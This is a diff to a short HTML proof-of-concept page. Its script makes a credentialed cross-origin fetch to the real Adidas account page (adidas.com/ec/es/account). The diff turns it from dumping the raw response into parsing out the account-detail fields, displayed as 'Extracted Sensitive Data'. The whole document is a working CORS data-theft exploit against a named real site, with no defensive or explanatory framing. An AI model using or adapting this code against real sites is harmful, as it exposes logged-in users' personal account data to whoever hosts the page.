@@ -1,15 +1,15 @@
-```html id="j3v9qm"
+```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Account Test</title>
+    <title>CORS Sensitive Data Test</title>
 </head>
 <body>
 
-<h2>Adidas Account CORS Test</h2>
-<pre id="output">Cargando respuesta...</pre>
+<h2>Extracted Sensitive Data</h2>
+<pre id="output">Cargando...</pre>
 
 <script>
 fetch("https://www.adidas.com/ec/es/account", {
@@ -17,17 +17,27 @@ fetch("https://www.adidas.com/ec/es/account", {
     credentials: "include"
 })
 .then(response => response.text())
-.then(data => {
-    document.getElementById("output").textContent = data;
-    console.log("Respuesta recibida:");
-    console.log(data);
+.then(html => {
+    const parser = new DOMParser();
+    const doc = parser.parseFromString(html, "text/html");
+
+    const values = Array.from(doc.querySelectorAll("dl dt, dl dd"))
+        .map(el => el.textContent.trim())
+        .filter(text => text.length > 0);
+
+    document.getElementById("output").textContent =
+        values.join("\n");
+        
+    console.log(values);
 })
 .catch(error => {
-    document.getElementById("output").textContent = "Error: " + error;
-    console.error("Fetch error:", error);
+    document.getElementById("output").textContent =
+        "Error: " + error;
+    console.error(error);
 });
 </script>
 
 </body>
 </html>
 ```
+
